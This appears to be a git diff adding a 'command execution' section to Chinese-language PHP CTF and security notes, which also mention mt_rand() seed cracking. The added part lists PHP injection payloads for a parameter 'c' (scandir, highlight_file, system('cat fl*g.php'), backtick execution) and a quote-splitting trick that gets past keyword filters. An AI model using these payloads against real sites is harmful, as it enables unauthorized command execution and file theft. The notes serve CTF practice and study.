@@ -18,6 +18,7 @@ comments: true
 - [7. php探针](#7-php探针)
 - [8. 爆破](#8-爆破)
   - [8.1 mt\_rand()爆破](#81-mt_rand爆破)
+- [9. 命令执行](#9-命令执行)
 
 
 ## 前言<br>
@@ -69,3 +70,17 @@ PHP探针是用来探测空间、服务器运行状况和PHP信息的。探针�
 ### 8.1 mt_rand()爆破<br>
 [https://www.openwall.com/php_mt_seed/](https://www.openwall.com/php_mt_seed/)<br>
 **PHP mt_rand() seed cracker**，因为php代码中的mt_rand()函数一旦种子确定，变换就是确定的！<br>
+
+## 9. 命令执行<br>
+如果网页中有命令执行相关的函数，就可以想办法绕过前期的检测(比如`正则校验`)，然后执行它！<br>
+常见的`php`命令注入:<br>
+```php
+c=echo scandir(".")[2]; //打印当前目录下的文件，第三个元素
+c=highlight_file(next(array_reverse(scandir(".")))); //查看当前目录下的文件，倒序后，取第二个元素，然后高亮显示
+
+c=system("cat fl*g.php | grep  -E 'fl.g' "); // 获取文件的内容，然后用grep 采用正则表达式的方法，获得flag
+c=system("cat fl*g.php"); // 需要采用view-source协议
+c=system("tac fl*g.php"); //倒叙（行）显示文件内容
+
+echo `cat fl''ag.p''hp`; // 反引号执行命令， 用单引号绕过flag,php不能打印的限制，需要采用view-source协议
+```
